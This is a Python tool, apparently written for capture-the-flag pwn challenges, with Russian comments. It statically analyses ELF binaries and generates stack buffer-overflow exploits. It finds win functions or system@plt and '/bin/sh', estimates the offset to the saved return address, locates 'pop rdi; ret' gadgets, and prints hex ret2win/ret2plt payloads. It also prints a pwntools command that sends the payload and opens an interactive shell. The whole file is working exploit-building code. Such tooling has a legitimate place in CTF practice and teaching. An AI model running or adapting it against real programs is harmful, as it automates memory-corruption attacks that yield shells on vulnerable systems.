#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
autopwn.py — статический сборщик payload для простого ret2win / ret2plt.

  python autopwn.py ./chall
  python autopwn.py ./chall --json

Что делает (без запуска бинарника, без Linux):
1. читает профиль защит (NX/PIE/canary/RELRO) — от него зависит, имеет ли
   смысл ret2win;
2. ищет цель: функцию `win`/`get_flag`/`shell` или `system@plt` + `/bin/sh`;
3. находит смещение буфера по дизассемблеру уязвимой функции
   (`lea rdi, [rbp-0x40]`, `lea rdi, [rsp+0x20]`, `sub rsp, N`);
4. ищет гаджет `pop rdi; ret` для передачи аргумента;
5. печатает готовые payload'ы (hex) и сниппет для pwntools.

Это не автопилот: если включена канарейка или PIE, честно говорит, что нужна
утечка, и отдаёт только то, что можно посчитать статически.
"""
from __future__ import annotations

try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import importlib.util
import json
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
sys.path.insert(0, os.path.join(_ROOT, "ml"))


def _load(name, rel):
    spec = importlib.util.spec_from_file_location(name, os.path.join(_ROOT, rel))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)          # type: ignore[union-attr]
    return mod


elf_symbols = _load("elf_symbols", os.path.join("reverse", "symbols.py"))
import pwn_features  # noqa: E402

WIN_NAMES = ("win", "get_flag", "flag", "print_flag", "cat_flag", "shell",
             "getshell", "backdoor", "give_shell", "secret", "admin")
VULN_FUNCS = ("main", "vuln", "vulnerable", "chall", "challenge", "pwnme",
              "gets_input", "read_input")
DANGEROUS = ("gets", "strcpy", "strcat", "sprintf", "scanf", "read", "fgets")


def _entry_point(data, is64):
    return struct.unpack_from("<Q" if is64 else "<I", data, 0x18)[0]


def _section(data, want: str):
    for nm, typ, addr, off, size, _link, _ent in elf_symbols._sections(data):
        if nm == want:
            return addr, off, size
    return None


def _exec_ranges(data):
    """[(addr, off, size)] исполняемых секций."""
    out = []
    for nm, _t, addr, off, size, _l, _e in elf_symbols._sections(data):
        if nm in (".text", ".init", ".fini", ".plt") and size:
            out.append((addr, off, size))
    return out


def find_gadgets(data, is64):
    """pop rdi; ret (5f c3) и ret (c3) — адреса в виртуальном пространстве."""
    gadgets = {"pop_rdi_ret": None, "ret": None}
    for addr, off, size in _exec_ranges(data):
        blob = data[off:off + size]
        i = blob.find(b"\x5f\xc3")
        if i >= 0 and gadgets["pop_rdi_ret"] is None:
            gadgets["pop_rdi_ret"] = addr + i
        j = blob.find(b"\xc3")
        if j >= 0 and gadgets["ret"] is None:
            gadgets["ret"] = addr + j
    return gadgets


def find_offsets(data, is64, symbols):
    """Кандидаты смещения до saved RIP из дизассемблера уязвимых функций."""
    try:
        import capstone
    except Exception:
        return [], "capstone нет — смещение не посчитать"
    md = capstone.Cs(capstone.CS_ARCH_X86,
                     capstone.CS_MODE_64 if is64 else capstone.CS_MODE_32)
    md.detail = False
    # функции: сначала по именам, потом main
    funcs = {}
    for name, addr, typ in symbols:
        if typ == 2 and addr and name.lstrip("_") in VULN_FUNCS:
            funcs.setdefault(name.lstrip("_"), addr)
    targets = [(n, a) for n, a in funcs.items()]
    if not targets:
        return [], "не нашёл main/vuln в символах (stripped?)"
    out = []
    for name, start in targets:
        # окно: от старта функции до 400 байт (main бывает маленьким)
        for addr, off, size in _exec_ranges(data):
            if not (addr <= start < addr + size):
                continue
            code = data[off + (start - addr):off + (start - addr) + 400]
            for ins in md.disasm(code, start):
                op = ins.op_str.replace(" ", "").lower()
                if ins.mnemonic == "lea" and op.startswith(("rdi,[rbp-", "rdi,[rsp+")):
                    try:
                        disp = int(op.split(",")[1].split("-")[1], 0) if "-" in op \
                            else int(op.split("+")[1], 0)
                    except (ValueError, IndexError):
                        continue
                    out.append({"func": name, "how": f"lea rdi, {op.split(',')[1]}",
                                "offset": disp + 8})
                elif ins.mnemonic == "sub" and op.startswith("rsp,"):
                    try:
                        n = int(op.split(",")[1], 0)
                    except ValueError:
                        continue
                    out.append({"func": name, "how": f"sub rsp, {n:#x}",
                                "offset": n + 8})
                elif ins.mnemonic == "call":
                    break          # ушли из пролога функции
    # убрать дубли
    seen, uniq = set(), []
    for c in out:
        if c["offset"] not in seen:
            seen.add(c["offset"])
            uniq.append(c)
    return uniq[:4], ""


def analyse(path: str):
    with open(path, "rb") as fh:
        data = fh.read(64 * 1024 * 1024)
    if data[:4] != b"\x7fELF":
        return {"file": path, "error": "не ELF"}
    is64 = data[4] == 2
    prof = pwn_features.profile(data)
    syms, note = elf_symbols.symbols(data)
    pack = "Q" if is64 else "I"
    win = None
    for name, addr, typ in syms:
        if typ == 2 and addr and name.lstrip("_").lower() in WIN_NAMES:
            win = {"name": name, "addr": addr}
            break
    system = None
    for name, addr, typ in syms:
        if name in ("system",) and addr:
            system = {"name": name, "addr": addr}
            break
    binsh = None
    idx = data.find(b"/bin/sh\x00")
    if idx >= 0:
        for _nm, _t, a, o, size, _l, _e in elf_symbols._sections(data):
            if o <= idx < o + size:
                binsh = a + (idx - o)
                break
        if binsh is None:
            binsh = idx
    gadgets = find_gadgets(data, is64)
    offsets, why = find_offsets(data, is64, syms)

    res = {"file": path, "bits": 64 if is64 else 32, "profile": prof,
           "win": win, "system": system, "binsh": binsh,
           "gadgets": {k: (hex(v) if v else None) for k, v in gadgets.items()},
           "offsets": offsets, "note": note or why, "payloads": []}

    blocked = []
    if prof.get("canary"):
        blocked.append("canary")
    if prof.get("pie"):
        blocked.append("PIE")
    if blocked:
        res["blocked"] = blocked
        return res

    if win:
        chain = [win["addr"]]
        what = f"ret2win → {win['name']}"
    elif system and binsh and gadgets["pop_rdi_ret"]:
        chain = [gadgets["pop_rdi_ret"], binsh, system["addr"]]
        what = "ret2plt → system(\"/bin/sh\")"
    else:
        res["blocked"] = ["нет ни win-функции, ни system+/bin/sh+гаджета"]
        return res

    for c in offsets:
        payload = b"A" * c["offset"] + b"".join(struct.pack("<" + pack, v) for v in chain)
        res["payloads"].append({"offset": c["offset"], "how": c["how"],
                                "what": what, "hex": payload.hex(),
                                "len": len(payload)})
    if not offsets and win:
        for off in (24, 40, 64, 72, 88, 104, 120):
            payload = b"A" * off + struct.pack("<" + pack, win["addr"])
            res["payloads"].append({"offset": off, "how": "типовое смещение",
                                    "what": what, "hex": payload.hex(),
                                    "len": len(payload)})
    return res


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("file")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    try:
        r = analyse(args.file)
    except OSError as exc:
        print(f"[-] {exc}")
        return 2
    if args.json:
        print(json.dumps(r, ensure_ascii=False))
        return 0
    print(f"[+] {args.file} ({r.get('bits', '?')} бит)")
    if r.get("error"):
        print(f"[-] {r['error']}")
        return 1
    p = r["profile"]
    print(f"    защиты: NX={'on' if p.get('nx') else 'OFF'}, "
          f"PIE={'on' if p.get('pie') else 'off'}, "
          f"canary={'on' if p.get('canary') else 'OFF'}, RELRO={p.get('relro')}")
    if r.get("win"):
        print(f"    цель: {r['win']['name']} @ {r['win']['addr']:#x}")
    elif r.get("system"):
        print(f"    цель: system @ {r['system']['addr']:#x}, "
              f"/bin/sh @ {r['binsh']:#x}" if r.get("binsh") else
              f"    цель: system @ {r['system']['addr']:#x}, /bin/sh не найден")
    print(f"    гаджеты: {r['gadgets']}")
    if r.get("blocked"):
        print(f"[!] нужна утечка: {', '.join(r['blocked'])} — "
              f"статический payload не собрать")
        return 1
    for off in r["offsets"]:
        print(f"    смещение {off['offset']} ({off['how']}, {off['func']})")
    if not r["payloads"]:
        print("[-] payload не собрался")
        return 1
    for pl in r["payloads"][:3]:
        print(f"[!] payload ({pl['what']}, offset {pl['offset']}): {pl['hex']}")
    best = r["payloads"][0]
    print("\n    pwntools:")
    print(f"    python -c \"from pwn import *; "
          f"p=process('./{os.path.basename(args.file)}'); "
          f"p.sendline(bytes.fromhex('{best['hex']}')); p.interactive()\"")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
